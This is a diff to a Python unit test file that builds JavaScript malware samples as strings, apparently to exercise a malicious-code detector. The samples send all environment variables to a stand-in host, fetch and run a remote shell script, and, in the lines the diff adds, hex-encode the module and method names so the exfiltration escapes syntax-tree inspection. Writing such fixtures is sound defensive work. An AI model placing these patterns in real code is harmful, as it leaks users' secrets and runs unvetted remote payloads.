@@ -214,10 +214,13 @@ class CoreParityTests(unittest.TestCase):
                    "spawn(process.execPath, [filePath], { detached: true, stdio: 'ignore' }).unref();\n")
         worker = ("const https = require('https');\nconst body = JSON.stringify(process.env);\n"
                   "https.request({ host: 'collector.invalid', method: 'POST' }).end(body);\n")
+        # (the module's name and its method's hidden: the tree sees no request until
+        # the decoded view names them)
         metrics = ("(() => {\n  const a = require(\n    Buffer.from(\"%s\", \"hex\").toString()\n  );\n"
                    "  const e = Object.keys(process[\"env\"]).map(k => [k, process[\"env\"][k]]);\n"
-                   "  a.request({ hostname: 'collector.invalid', method: 'POST' }).end(JSON.stringify(e));\n})();\n"
-                   % "https".encode().hex())
+                   "  a[Buffer.from(\"%s\", \"hex\").toString()]({ hostname: 'collector.invalid', method: 'POST' })"
+                   ".end(JSON.stringify(e));\n})();\n"
+                   % ("https".encode().hex(), "request".encode().hex()))
         dropper = ("const fs = require('fs');\nconst { spawn } = require('child_process');\n(async () => {\n"
                    "  const r = await fetch('https://files.invalid/s.sh');\n  fs.writeFileSync(f, await r.text());\n"
                    "  spawn('bash', [f]);\n})();\n")
